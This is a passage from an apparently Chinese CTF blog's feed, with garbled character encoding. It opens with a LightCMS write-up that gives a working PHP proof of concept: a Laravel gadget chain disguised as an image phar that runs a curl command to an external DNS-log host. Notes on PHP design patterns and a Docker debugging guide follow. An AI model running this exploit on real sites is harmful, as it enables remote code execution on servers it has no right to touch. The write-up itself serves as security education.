&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªswitchæ´¾ç”Ÿäº†è¿™ä¸ªæ¼æ´éœ€è¦åˆ©ç”¨çš„ä¸¤ä¸ªåˆ†æ”¯ï¼špharååºåˆ—åŒ–çš„ç‚¹ åŠ ä¸Šä¼ pharæ–‡ä»¶çš„ç‚¹ã€‚</p><h3 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h3><p>è¿›å…¥ <code>case $this-&gt;isUrl()</code>åˆ†æ”¯ï¼Œè·Ÿè¿› <code>$this-&gt;initFromUrl()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initFromUrl</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line"><span class="comment">//!!é‡ç‚¹æ–¹æ³•!!</span></span><br><span class="line">    <span class="comment">//$urlå¯æ§ï¼Œä¸ºè¿œç¨‹æ–‡ä»¶å†…å®¹ã€‚è‹¥æŒ‡å®šä¸ºä¸€ä¸ªpharæ–‡ä»¶å³å¯è§¦å‘ååºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> = @file_get_contents(<span class="variable">$url</span>, <span class="literal">false</span>, <span class="variable">$context</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromBinary(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//!!é‡ç‚¹æ–¹æ³•!!</span></span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸Šä¼ pharæ–‡ä»¶"><a href="#ä¸Šä¼ pharæ–‡ä»¶" class="headerlink" title="ä¸Šä¼ pharæ–‡ä»¶"></a>ä¸Šä¼ pharæ–‡ä»¶</h3><p>è¿›å…¥ <code>case $this-&gt;isBinary()</code>åˆ†æ”¯ï¼Œè·Ÿè¿› <code>$this-&gt;initFromBinary()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initFromBinary</span>(<span class="params"><span class="variable">$binary</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$resource</span> = @imagecreatefromstring(<span class="variable">$binary</span>);</span><br><span class="line">    <span class="variable">$image</span> = <span class="keyword">$this</span>-&gt;initFromGdResource(<span class="variable">$resource</span>);</span><br><span class="line">    <span class="comment">//è·å–æ–‡ä»¶MIMEç±»å‹</span></span><br><span class="line">    <span class="comment">//CVE-2021-27112çš„è¡¥ä¸å°±æ˜¯æ ¹æ®è¿™é‡Œè·å–çš„æ–‡ä»¶å¤´ä½œä¸ºMIMEç±»å‹æ¥é™åˆ¶åç¼€ï¼Œå¯¼è‡´æˆ‘ä»¬åªèƒ½ä¿å­˜å›¾ç‰‡ç±»å‹çš„åç¼€</span></span><br><span class="line">    <span class="comment">//ä¸è¿‡æ–‡ä»¶åç¼€å’Œæ–‡ä»¶å¤´å¯¹pharæ–‡ä»¶æ²¡æœ‰å½±å“ï¼Œåªè¦å†…å®¹æ ¼å¼æ­£ç¡®å³å¯</span></span><br><span class="line">    <span class="variable">$image</span>-&gt;mime = finfo_buffer(finfo_open(FILEINFO_MIME_TYPE), <span class="variable">$binary</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$image</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»¼ä¸Šåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºè¿™æ ·ä¸€ä¸ªåˆ©ç”¨é“¾ï¼š<strong>é¦–å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å¤´æ˜¯å›¾ç‰‡ç±»å‹çš„pharæ–‡ä»¶ï¼Œpharæ–‡ä»¶å†…å®¹ä¸º phpggc ä¸­laravel6.xçš„ååºåˆ—åŒ–é“¾ã€‚è·å–åˆ°pharæ–‡ä»¶ä¸Šä¼ è·¯å¾„åï¼Œç„¶åå†ä¸Šä¼ ä¸€ä¸ªâ€œURLæ–‡ä»¶â€ï¼Œå†…å®¹ä¸ºpharè·¯å¾„çš„æ–‡ä»¶ã€‚å³å¯è§¦å‘pharååºåˆ—åŒ–</strong></p><h2 id="POCç¼–å†™"><a href="#POCç¼–å†™" class="headerlink" title="POCç¼–å†™"></a>POCç¼–å†™</h2><p>æŒ‰ç…§æ­£å¸¸é€»è¾‘ï¼Œæˆ‘ä»¬çš„POCå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//é“¾å­ä»phpggcæ‰’æ‹‰ä¸‹æ¥çš„</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher(<span class="variable">$function</span>); </span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> \Illuminate\Queue\CallQueuedClosure(<span class="variable">$parameter</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Queue</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CallQueuedClosure</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="variable">$parameter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$o = new \Illuminate\Broadcasting\PendingBroadcast(&#x27;system&#x27;,&#x27;curl xxx1.8ogfme.dnslog.cn&#x27;);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®GIFæ–‡ä»¶å¤´</span></span><br><span class="line">    <span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ xxd æŸ¥çœ‹æ–‡ä»¶ç»“æ„ï¼š</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-4.png" width="600px"><p>è¯·æ±‚å¦‚ä¸‹ï¼š</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-3.png" width="800px"><p>ç„¶åã€‚ã€‚ã€‚å°±æŠ¥é”™äº†ã€‚ã€‚ã€‚ç”±äºä¸‹è½½è¿œç¨‹å›¾ç‰‡æ—¶ä½¿ç”¨äº† <code>imagecreatefromstring()</code>ã€‚è€Œæˆ‘ä»¬çš„ <em>phar.jpg</em> ä¸æ˜¯ä¸€ä¸ªæ­£è§„çš„å›¾ç‰‡ï¼Œå¯¼è‡´è¯¥æ–¹æ³•æ— æ³•æ­£å¸¸ç”Ÿæˆå›¾ç‰‡ï¼Œé‚æŠ¥é”™ã€‚ã€‚ã€‚</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-2.png" width="800px"><p>è§£å†³åŠæ³•ä¹ŸæŒºç®€å•ï¼Œåªéœ€è¦åœ¨æ–‡ä»¶ä¸­å­˜åœ¨æœ‰ <code>&lt;?php __HALT_COMPILER(); ?&gt;</code> å³å¯ã€‚å“ªæ€•å®ƒä½äºæ–‡ä»¶çš„æœ«å°¾ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$o = new \Illuminate\Broadcasting\PendingBroadcast(&#x27;system&#x27;,&#x27;curl xxx1.8ogfme.dnslog.cn&#x27;);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="comment">//åœ¨æ–‡ä»¶å¤´å¤„æ”¾ä¸€ä¸ªæ­£å¸¸å›¾ç‰‡å³å¯</span></span><br><span class="line"><span class="variable">$f</span> = file_get_contents(<span class="string">&quot;222222.png&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setStub(<span class="variable">$f</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºæˆåŠŸè¿”å›ä¸Šä¼ æ–‡ä»¶è·¯å¾„ï¼š</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-5.png" width="1000px"><p>æ ¹æ®æ–‡ä»¶è·¯å¾„æ„é€  â€œURLæ–‡ä»¶â€ çš„å†…å®¹ï¼š</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-6.png" width="500px"><p>æ­¤æ—¶å†æ¬¡è¯·æ±‚ï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼š</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-7.png" width="800px">]]></content>
    
    
    <summary type="html">&lt;p&gt;æ˜¨å¤©è¢«æˆ‘äº²çˆ±çš„å°æ°æ°å’Œå¸ˆå¼Ÿæ‹‰å»ç©è€äº†ä¸€æ³¢çº¢å¸½æ¯ã€‚ã€‚æ¥å†™ä¸‹wpåšä¸ªå°è®°å½•ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡è¿˜æ˜¯åªè§£å‡ºæ¥ä¸€é¢˜WEB2ï¼Œï¼Œè€åºŸç‰©äº†ã€‚ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;æœ€è¿‘æ²¡å’‹æ›´åšå®¢ã€‚ã€‚å› ä¸ºæ–‡ç« éƒ½å‘åˆ°å®‰å…¨å®¢ä¸Šæ··ç‚¹é›¶èŠ±é’±ç”¨äº†ã€‚ã€‚ã€‚= =&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="WEB" scheme="http://example.com/categories/CTF/WEB/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="LightCMS" scheme="http://example.com/tags/LightCMS/"/>
    
    <category term="Yii2" scheme="http://example.com/tags/Yii2/"/>
    
  </entry>
  
  <entry>
    <title>PHPè®¾è®¡æ¨¡å¼å­¦ä¹ </title>
    <link href="http://example.com/2021/03/24/2021-03-24-php-design-patterns/"/>
    <id>http://example.com/2021/03/24/2021-03-24-php-design-patterns/</id>
    <published>2021-03-24T12:10:33.000Z</published>
    <updated>2021-03-24T15:27:19.236Z</updated>
    
    <content type="html"><![CDATA[<p>å‘ç°äº†è¿™ä¸ªå†™çš„å¥½å¥½ï¼Œ</p><p><a href="https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html">https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html</a></p><p>å•§ã€‚ã€‚æ„Ÿè§‰æ²¡æœ‰å†é‡å¤å†™çš„å¿…è¦äº†ã€‚å°±ç®€å•åœ¨è¿™é‡Œå†™å†™ç†è§£å§ã€‚ä»¥ä¸‹éƒ½æ˜¯è¾ƒä¸ºç®€å•çš„æ¶‰çŒäº†ä¸‹å†™çš„ç†è§£ï¼Œå¯èƒ½æœ‰ä¸å¯¹çš„åœ°æ–¹ã€‚ã€‚</p><p>å­¦ä¹ æºç ï¼š</p><p><a href="https://github.com/DesignPatternsPHP/DesignPatternsPHP">https://github.com/DesignPatternsPHP/DesignPatternsPHP</a></p><span id="more"></span><br><h1 id="æŠ½è±¡å·¥å‚æ¨¡å¼"><a href="#æŠ½è±¡å·¥å‚æ¨¡å¼" class="headerlink" title="æŠ½è±¡å·¥å‚æ¨¡å¼"></a>æŠ½è±¡å·¥å‚æ¨¡å¼</h1><p><strong>ä¸ªäººç†è§£ï¼š</strong></p><p>ä½¿ç”¨å¯¹åº”å·¥å‚ç±»ï¼ˆFactoryï¼‰å®ä¾‹åŒ–å¯¹åº”çš„å†…éƒ¨ç±»ï¼ŒåŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªå·¥å‚ç±»å¯¹ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œé¿å…åœ¨å¤–éƒ¨ç›´æ¥å®ä¾‹åŒ–å†…éƒ¨ç±»ã€‚</p><p><strong>å¥½å¤„ï¼š</strong></p><p>ä½¿ç”¨å·¥å‚ç±»å®ä¾‹åŒ–çš„æ—¶å€™ï¼Œå¤–éƒ¨è°ƒç”¨è€…ä¸éœ€è¦çŸ¥é“å†…éƒ¨ç±»å®ä¾‹åŒ–éœ€è¦ä¼ ä»€ä¹ˆå‚æ•°ï¼Œç›´æ¥è°ƒç”¨å·¥å‚ç±»çš„ç‰¹å®šæ–¹æ³•å³å¯ã€‚</p><br><h1 id="ç”Ÿæˆå™¨æ¨¡å¼"><a href="#ç”Ÿæˆå™¨æ¨¡å¼" class="headerlink" title="ç”Ÿæˆå™¨æ¨¡å¼"></a>ç”Ÿæˆå™¨æ¨¡å¼</h1><p><strong>ä¸ªäººç†è§£ï¼š</strong></p><p>Interface Builder: ç”Ÿæˆå™¨æ¥å£ï¼Œç”¨äºå®šä¹‰å…·æœ‰<strong>ç›¸åŒ</strong>æˆ–<strong>ç±»ä¼¼</strong>åŠŸèƒ½çš„å†…éƒ¨ç±»è¦å®ç°çš„æ–¹æ³•ã€‚æ¯”å¦‚ æ•°æ®åº“é©±åŠ¨ç±»ï¼Œæ•°æ®åº“é©±åŠ¨æœ‰ mysqlã€oracleã€mssql ç­‰ç­‰ï¼Œéœ€è¦ä¸€ä¸€å®ç°ç”Ÿæˆå™¨æ¥å£ã€‚</p><p>æš´éœ²ç»™å¤–éƒ¨ç±»è°ƒç”¨çš„å°±åªæœ‰ä¸€ä¸ª <strong>å¯¼å‘å™¨</strong>ï¼ˆDirectorï¼‰ï¼Œé€šè¿‡ä¼ å…¥å„ä¸ªä¸åŒçš„ç±»å®ä¾‹ï¼Œæ¥è°ƒç”¨è¿™äº›ç±»çš„ç”Ÿæˆå™¨æ–¹æ³•ï¼Œå°†ä¸€ä¸ª â€œç©ºç±»â€ åŒ…è£…å¥½ï¼Œè®¾ç½®å¥½è¯¥è®¾ç½®çš„å±æ€§ã€‚</p><p><strong>å¥½å¤„ï¼š</strong></p><p>å¤–éƒ¨è°ƒç”¨è€…ç›´æ¥å‘<strong>å¯¼å‘å™¨</strong>ä¼ å…¥å®ä¾‹å³å¯å¾—åˆ°å¯¹åº”ç±»çš„ â€œå®Œæ•´ç‰ˆâ€ã€‚ä¸éœ€è¦å¤–éƒ¨è°ƒç”¨ç€æ‰‹åŠ¨é…ç½®ã€‚</p><br><p>ã€‚ã€‚ã€‚ã€‚æœªå®Œå¾…ç»­ã€‚ã€‚éšç¼˜æ›´æ–°ã€‚ã€‚ã€‚ = =</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‘ç°äº†è¿™ä¸ªå†™çš„å¥½å¥½ï¼Œ&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html&quot;&gt;https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å•§ã€‚ã€‚æ„Ÿè§‰æ²¡æœ‰å†é‡å¤å†™çš„å¿…è¦äº†ã€‚å°±ç®€å•åœ¨è¿™é‡Œå†™å†™ç†è§£å§ã€‚ä»¥ä¸‹éƒ½æ˜¯è¾ƒä¸ºç®€å•çš„æ¶‰çŒäº†ä¸‹å†™çš„ç†è§£ï¼Œå¯èƒ½æœ‰ä¸å¯¹çš„åœ°æ–¹ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;å­¦ä¹ æºç ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/DesignPatternsPHP/DesignPatternsPHP&quot;&gt;https://github.com/DesignPatternsPHP/DesignPatternsPHP&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="http://example.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHPSTORM è°ƒè¯• Dockerå†…é¡¹ç›®</title>
    <link href="http://example.com/2021/03/17/2021-03-17-phpstorm-docker/"/>
    <id>http://example.com/2021/03/17/2021-03-17-phpstorm-docker/</id>
    <published>2021-03-17T12:04:27.000Z</published>
    <updated>2021-03-24T15:33:56.028Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡é¦–å‘åœ¨ Freebufã€‚ä½†å¥½åƒæ’ç‰ˆæ²¡é‚£ä¹ˆå¥½çœ‹ 233.ã€‚ã€‚ã€‚äºæ˜¯æƒ³åšå®¢ä¹Ÿå‘ä¸€ä»½å¯¹ç…§çœ‹çœ‹ï¼Œä¸ªäººæ„Ÿè§‰è¿˜æ˜¯æˆ‘è¿™é‡Œçš„æ’ç‰ˆå¥½çœ‹ç‚¹å“ˆå“ˆå“ˆ</p><span id="more"></span><br><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨åšä¸€äº›CTFçš„å®¡è®¡é¢˜æˆ–è€…å¤ç°æ¼æ´æ—¶ï¼Œä¼šå¾—åˆ° Docker ç¯å¢ƒã€‚éœ€è¦æˆ‘ä»¬åœ¨ Dockerç¯å¢ƒä¸­è¿›è¡Œä»£ç è°ƒè¯•ã€‚åœ¨ PHP ä»£ç å®¡è®¡ä¸­ï¼Œæ²¡æœ‰å¥½çš„è°ƒè¯•ç¯å¢ƒï¼ˆå¦‚ xdebugè¿™ç±»è°ƒè¯•å·¥å…·ï¼‰ï¼Œå•å•é  var_dump å’Œ debug_print_backtrace æ¥æ‰‹æ’•ä»£ç ï¼Œæ•ˆç‡ååˆ†ä½ä¸‹ã€‚è€Œè¦é…å¥½ä¸€ä¸ªè°ƒè¯•ç¯å¢ƒæœ‰æ—¶ä¹Ÿæ˜¯æŒºå¤šå‘çš„ã€‚ä¿—è¯è¯´â€œæ­å»ºç¯å¢ƒä¸¤å°æ—¶ï¼Œæ¼æ´å¤ç°ä¸¤åˆ†é’Ÿâ€ã€‚æœ¬æ–‡å°±æ¥ç®€å•è¯´è¯´å¦‚ä½•ä½¿ç”¨ PHPSTORM è°ƒè¯• Dockeré¡¹ç›®ã€‚</p><br><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œéœ€è¦ç®€å•äº†è§£ä¸‹ Dockerã€‚è‡³å°‘è¦ä¼šæœ€åŸºæœ¬çš„ç”¨æ³•ã€‚ä¸è¿‡ç”±äºä¸»è¦æ˜¯è®² PHPSTORM è°ƒè¯•çš„ã€‚æ‰€ä»¥ Dockerä»‹ç»ä¸ä¼šè®²å¤ªå¤šã€‚è‹¥æƒ³äº†è§£æ›´å¤šçš„è¯å»ºè®®çœ‹æ‰‹å†Œã€‚</p><br><h1 id="DockeråŸºæœ¬ç”¨æ³•"><a href="#DockeråŸºæœ¬ç”¨æ³•" class="headerlink" title="DockeråŸºæœ¬ç”¨æ³•"></a>DockeråŸºæœ¬ç”¨æ³•</h1><p>é¦–å…ˆè¦çŸ¥é“ Docker æœ€åŸºæœ¬çš„ä¸¤æ ·ä¸œè¥¿ï¼š<strong>image</strong> å’Œ <strong>container</strong></p><p><strong>image</strong> å°±æ˜¯é•œåƒï¼Œæ­å»ºä¸€ä¸ª Docker ç¯å¢ƒæœ€åŸºæœ¬çš„å°±æ˜¯ imageã€‚å¯ä»¥<strong>ç®€å•ç†è§£</strong>ä¸ºè¿™å°±æ˜¯åˆ›å»ºè™šæ‹Ÿæœºçš„é‚£ä¸ªé•œåƒã€‚</p><p><strong>container</strong> å°±æ˜¯å®¹å™¨ã€‚å³ ä¾æ® imageï¼Œåˆ›å»ºå‡ºæ¥çš„è™šæ‹Ÿç¯å¢ƒã€‚å¯ä»¥<strong>ç®€å•ç†è§£</strong>ä¸ºå°±æ˜¯è¿è¡Œç€çš„è™šæ‹Ÿæœº</p><br><p>Docker çš„é…ç½®æ–‡ä»¶ä¸º Dockerfileã€‚è¯¥æ–‡ä»¶å†…å®¹ä¸ºæ„å»º container çš„å‘½ä»¤ã€‚åŸºæœ¬å‘½ä»¤æœ‰ï¼š</p><p><strong>FROM</strong> è®¾ç½® container è¿è¡Œåœ¨å“ªä¸ª image ä¸Šã€‚å¿…é¡»å†™åœ¨ Dockerfile çš„å¼€å¤´ã€‚å¯ä»¥åœ¨ <a href="https://hub.docker.com/">Docker Hub</a> é‡Œæ‰¾é€‚åˆçš„ imageã€‚</p><p><strong>RUN</strong> åœ¨ image <strong>build</strong> æ—¶æ‰§è¡Œå‘½ä»¤ã€‚ä¸€èˆ¬ç”¨äºå®‰è£…ç¯å¢ƒ</p><p><strong>CMD</strong> åœ¨ container<strong>åˆšå¯åŠ¨</strong>æ—¶æ‰§è¡Œå‘½ä»¤ã€‚ä¸€èˆ¬ç”¨äºå¯åŠ¨æœåŠ¡</p><p><strong>COPY</strong> å°†å®¿ä¸»æœºçš„æ–‡ä»¶æ‹·è´åˆ° containerä¸­</p><p><strong>WORKDIR</strong> è®¾ç½®å·¥ä½œç›®å½•ã€‚æ‰€æœ‰å‘½ä»¤éƒ½ä¼šåœ¨è¿™ä¸ªç›®å½•çš„åŸºç¡€ä¸Šè¿›è¡Œå·¥ä½œ</p><br><p>äº†è§£äº†ä¸Šé¢çš„ä¸‰ä¸ªå‘½ä»¤åï¼Œæˆ‘ä»¬å¯ä»¥æ¥ç®€å•å†™ä¸€ä¸ª Dockerfileäº†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">åŸºç¡€ image ä¸º php:7.3-apache</span></span><br><span class="line">FROM php:7.3-apache</span><br><span class="line"><span class="meta">#</span><span class="bash">å®‰è£… xdebug æ‰©å±• å¹¶å¼€å¯</span></span><br><span class="line">RUN pecl install xdebug &amp;&amp; \</span><br><span class="line">docker-php-ext-enable xdebug</span><br><span class="line"><span class="meta">#</span><span class="bash">å°† å®¿ä¸»æœºçš„ phpinfo.php æ‹·è´åˆ° container /var/www/html/phpinfo.php ä¸­</span></span><br><span class="line">COPY ./phpinfo.php /var/www/html/phpinfo.php</span><br></pre></td></tr></table></figure><p>å†™å®Œååœ¨ Dockerfile çš„ç›®å½•é‡Œè¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t test/testmyphp .</span><br></pre></td></tr></table></figure><p>ç­‰å‘½ä»¤è·‘å®Œï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤å³å¯çœ‹åˆ°åˆ›å»ºå¥½çš„ image</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker image ls</span></span><br><span class="line">REPOSITORY                          TAG                  IMAGE ID            CREATED             SIZE</span><br><span class="line">test/testmyphp                      latest               4931b92274f2        56 seconds ago      413MB</span><br><span class="line">php                                 7.3-apache           b79d423ea1e9        2 months ago        411MB</span><br></pre></td></tr></table></figure><p>è¦æƒ³è®© container è¿è¡Œèµ·æ¥ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ã€‚ä½¿ç”¨ <code>-p</code> æ¥æŒ‡å®šæ˜ å°„ç«¯å£ï¼Œå·¦è¾¹æ˜¯å®¿èˆæœºç«¯å£ï¼Œå³è¾¹æ˜¯ container ç«¯å£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 81:80 test/testmyphp</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è¿è¡Œä¸­çš„ container</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker container ls</span></span><br><span class="line">CONTAINER ID        IMAGE              PORTS                ......</span><br><span class="line">10b8c28b2f69        test/testmyphp     0.0.0.0:81-&gt;80/tcp   ......</span><br></pre></td></tr></table></figure><p>è¿›å…¥ container çš„  shell</p><figure class="highlight 